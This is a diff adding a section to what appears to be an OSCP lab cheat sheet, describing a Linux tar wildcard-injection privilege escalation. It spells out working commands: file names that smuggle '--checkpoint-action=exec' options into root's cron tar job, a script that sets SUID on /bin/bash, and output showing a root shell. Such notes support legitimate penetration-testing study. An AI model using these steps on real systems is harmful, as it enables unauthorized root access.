@@ -2009,7 +2009,36 @@ borg delete /path/to/repo::Monday # Recover disk space by manually deleting the 
 #Offsec Challenge Lab Relia 19 - https://www.ddosi.org/oscp-cheat-sheet-2/
 ```
 
+## Linux Wildcard Exploit tar zip
+- In the crontab running the tar as root access (grep "CRON" /var/log/syslog)
+- Exploit using suid for /bin/bash, [reference](https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c) OSCPC 157, 
+  
+```bash
+grep "CRON" /var/log/syslog
+#Oct 14 02:16:01 oscp CRON[3716]: (root) CMD (cd /opt/admin && tar -zxf /tmp/backup.tar.gz *)
+cd /opt/admin
+echo "/bin/chmod 4755 /bin/bash" > shell.sh 
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "" > --checkpoint=1
+./shell.sh
+#/bin/chmod: changing permissions of '/bin/bash': Operation not permitted
+#Based on grep "CRON" /var/log/syslog has some file tar -zxf /tmp/backup.tar.gz *
+tar cf /tmp/backup.tar.gz *
+#/bin/chmod: changing permissions of '/bin/bash': Operation not permitted
+tar cf backup.tar.gz *
+ls -l
+#-rw-r--r-- 1 cassie cassie     1 Oct 14 03:18 '--checkpoint-action=exec=sh shell.sh'
+#-rw-r--r-- 1 cassie cassie     1 Oct 14 03:18 '--checkpoint=1'
+#-rw-r--r-- 1 cassie cassie 10240 Oct 14 03:48  backup.tar.gz
+#-rwxr-xr-x 1 cassie cassie    26 Oct 14 03:17  shell.sh
+ls -la /bin/bash
+#-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
+/bin/bash -p
+#uid=1000(cassie) gid=1000(cassie) euid=0(root) groups=1000(cassie),4(adm),24(cdrom),30(dip),46(plugdev)
+whoami
+#Got root shell
 
+```
 
 
 ---
